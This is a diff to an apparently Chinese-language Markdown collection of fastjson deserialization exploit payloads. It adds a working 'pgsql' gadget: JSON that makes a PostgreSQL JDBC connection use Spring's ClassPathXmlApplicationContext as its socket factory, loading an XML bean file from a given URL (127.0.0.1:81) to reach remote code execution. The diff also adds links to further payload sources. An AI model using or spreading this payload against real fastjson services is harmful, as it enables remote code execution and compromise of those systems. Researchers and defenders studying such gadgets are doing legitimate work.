@@ -279,6 +279,26 @@ Mysqlconnector 6.x or < 8.0.20
 "allowLoadLocalInfile":"true"}}}}
 ```
 
+#### pgsql
+```json
+
+{
+    "@type": "java.lang.AutoCloseable",
+    "@type": "org.postgresql.jdbc.PgConnection",
+    "hostSpecs": [{
+        "host": "127.0.0.1",
+        "port": 2333
+    }],
+    "user": "test",
+    "database": "test",
+    "info": {
+        "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
+        "socketFactoryArg": "http://127.0.0.1:81/test.xml"
+    },
+    "url": ""
+}
+
+```
 
 参考：
 - https://github.com/su18/fastjson-commons-io
@@ -289,3 +309,5 @@ Mysqlconnector 6.x or < 8.0.20
 - https://f5.pm/go-82366.html
 - [fastjson 读文件 gadget 的利用场景扩展](https://b1ue.cn/archives/506.html)
 - https://mp.weixin.qq.com/s/0yyZH_Axa0UTr8kquSixwQ
+- https://mp.weixin.qq.com/s/SwkJVTW3SddgA6uy_e59qg
+- https://github.com/kezibei/fastjson_payload
